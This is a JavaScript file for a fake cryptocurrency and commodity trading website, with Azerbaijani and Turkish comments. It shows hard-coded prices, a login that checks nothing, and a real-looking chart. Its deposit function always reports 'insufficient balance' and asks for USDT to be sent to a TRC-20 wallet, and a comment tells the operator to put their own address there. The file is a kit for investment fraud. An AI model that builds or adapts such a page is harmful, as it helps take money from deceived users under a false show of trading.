// 10 ELEMENTLİ SİYAHI
const assets = [
    { s: 'BTC', n: 'Bitcoin', p: '71,111.55', c: '-2.62%' },
    { s: 'ETH', n: 'Ethereum', p: '3,542.12', c: '-1.51%' },
    { s: 'SOL', n: 'Solana', p: '145.22', c: '+3.12%' },
    { s: 'XRP', n: 'Ripple', p: '0.62', c: '-0.45%' },
    { s: 'PEPE', n: 'Pepe Coin', p: '0.000008', c: '+12.5%' },
    { s: 'BNB', n: 'Binance Coin', p: '595.30', c: '-1.79%' },
    { s: 'DOGE', n: 'Dogecoin', p: '0.15', c: '+2.40%' },
    { s: 'XAUUSD', n: 'Qızıl (Gold)', p: '2,345.10', c: '+0.45%' },
    { s: 'XAGUSD', n: 'Gümüş (Silver)', p: '28.32', c: '-1.12%' },
    { s: 'UKOIL', n: 'Brent Neft', p: '90.15', c: '+1.20%' }
];

// ELEMENTLƏRİ EKRANA DÜZÜR
function initAssets() {
    const container = document.getElementById('assets-container');
    if(!container) return;
    container.innerHTML = assets.map(a => `
        <div class="asset-row p-4 flex justify-between items-center" onclick="openTrade('${a.s}')">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 rounded-full bg-[#1e2329] flex items-center justify-center font-bold text-xs text-yellow-500 border border-gray-700">${a.s.substring(0,2)}</div>
                <div>
                    <p class="font-bold text-sm text-white">${a.s}/USDT</p>
                    <p class="text-gray-500 text-[10px]">${a.n}</p>
                </div>
            </div>
            <div class="text-right">
                <p class="text-sm font-mono text-white">${a.p}</p>
                <p class="${a.c.includes('+') ? 'text-green-500' : 'text-red-500'} text-[10px] font-bold">${a.c}</p>
            </div>
        </div>
    `).join('');
}

// TRADE PENCERESİNİ AÇIR (GÜNCƏL KUR VƏ QRAFİK)
function openTrade(symbol) {
    document.getElementById('exchange-tab').classList.add('hidden');
    document.getElementById('wallet-tab').classList.add('hidden');
    document.getElementById('trade-window').classList.remove('hidden');

    // Başlığı yenilə
    document.getElementById('trade-pair-name').innerText = symbol.includes('USD') ? symbol : symbol + "/USDT";

    // Qrafik yerini təmizlə
    const container = document.getElementById('tv_container');
    container.innerHTML = ""; 

    // TradingView Widget (Canlı Data)
    setTimeout(() => {
        new TradingView.widget({
            "autosize": true,
            "symbol": symbol.includes('USD') ? "OANDA:" + symbol : (symbol === 'UKOIL' ? "TVC:UKOIL" : "BINANCE:" + symbol + "USDT"),
            "interval": "1",
            "theme": "dark",
            "style": "1",
            "locale": "tr",
            "container_id": "tv_container",
            "hide_top_toolbar": false,
            "allow_symbol_change": true,
            "save_image": false
        });
    }, 100);
}

// TABLAR ARASI KEÇİD
function showTab(tab) {
    document.getElementById('exchange-tab').classList.add('hidden');
    document.getElementById('wallet-tab').classList.add('hidden');
    document.getElementById('trade-window').classList.add('hidden');
    
    document.getElementById(tab + '-tab').classList.remove('hidden');
    
    // Tab düymələrinin rəngini dəyiş
    document.getElementById('tab-ex').classList.replace('text-white', 'text-gray-400');
    document.getElementById('tab-ex').classList.remove('border-b-2', 'border-yellow-500');
    document.getElementById('tab-wa').classList.replace('text-white', 'text-gray-400');
    document.getElementById('tab-wa').classList.remove('border-b-2', 'border-yellow-500');
    
    const activeBtn = tab === 'exchange' ? 'tab-ex' : 'tab-wa';
    document.getElementById(activeBtn).classList.replace('text-gray-400', 'text-white');
    document.getElementById(activeBtn).classList.add('border-b-2', 'border-yellow-500');

    if(tab === 'exchange') initAssets();
}

// GİRİŞ MƏNTİQİ
function login() {
    document.getElementById('authModal').classList.add('hidden');
    document.getElementById('mainContent').classList.remove('hidden');
    initAssets();
}

// YATIRIM TƏLƏBİ
function requestDeposit() {
    const myAddress = "TS2b7...SENIN_ADRESIN"; // <--- BURA ÖZ TRC-20 ADRESİNİ YAZ!
    alert("YETERSİZ BAKİYE!\n\nTicarete devam etmek için lütfen USDT (TRC-20) adresine yatırım yapın:\n\n" + myAddress);
}

// KÖMƏKÇİ FUNKSİYALAR
function toggleMenu(id) { document.getElementById(id).classList.toggle('hidden'); }
function toggleAuth() { 
    document.getElementById('loginForm').classList.toggle('hidden'); 
    document.getElementById('registerForm').classList.toggle('hidden'); 
}
function changeLanguage(lang) { 
    alert(lang === 'az' ? 'Dil dəyişdirildi: Azərbaycan' : 'Dil değiştirildi: Türkçe'); 
    toggleMenu('langMenuAuth'); 
}
